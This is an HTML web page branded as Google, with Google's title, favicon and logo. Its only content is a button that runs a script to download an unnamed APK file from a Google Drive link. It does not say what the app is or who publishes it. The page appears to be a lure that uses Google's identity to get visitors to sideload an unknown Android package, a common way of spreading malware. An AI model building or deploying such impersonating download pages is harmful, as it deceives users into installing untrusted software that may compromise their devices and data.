<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Google</title>
  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSTLNyHEp8ERADDJDy5wXQLoV_Lj0YTmv6eA&s" type="image/png">

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #e9ecef, #f8f9fa);
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      padding: 20px;
    }

    .card {
      background-color: white;
      padding: 40px 30px;
      border-radius: 20px;
      box-shadow: 0 12px 24px rgba(0, 0, 0, 0.1);
      text-align: center;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    .card:hover {
      transform: translateY(-5px);
      box-shadow: 0 16px 30px rgba(0, 0, 0, 0.15);
    }

    .logo img {
      width: 220px;
      margin-bottom: 30px;
    }

    .download-button {
      padding: 14px 26px;
      font-size: 17px;
      border: none;
      border-radius: 8px;
      background-color: #1a73e8;
      color: white;
      cursor: pointer;
      font-weight: bold;
      box-shadow: 0 4px 12px rgba(26, 115, 232, 0.3);
      transition: background-color 0.3s ease, box-shadow 0.3s ease;
    }

    .download-button:hover {
      background-color: #0c5cd8;
      box-shadow: 0 6px 18px rgba(26, 115, 232, 0.4);
    }

    @media (max-width: 480px) {
      .card {
        padding: 30px 20px;
      }

      .logo img {
        width: 180px;
      }

      .download-button {
        width: 100%;
        font-size: 16px;
      }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/640px-Google_2015_logo.svg.png" alt="Google Logo">
    </div>
    <button class="download-button" onclick="downloadApk()">Click here to download!</button>
  </div>

  <script>
    function downloadApk() {
      const fileUrl = "https://drive.usercontent.google.com/u/0/uc?id=1c1BP5bxXBxtwLfRJTrEPgMWK1yVFDF2R&export=download&authuser=0";
      const link = document.createElement("a");
      link.href = fileUrl;
      link.download = '';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }
  </script>
</body>
</html>
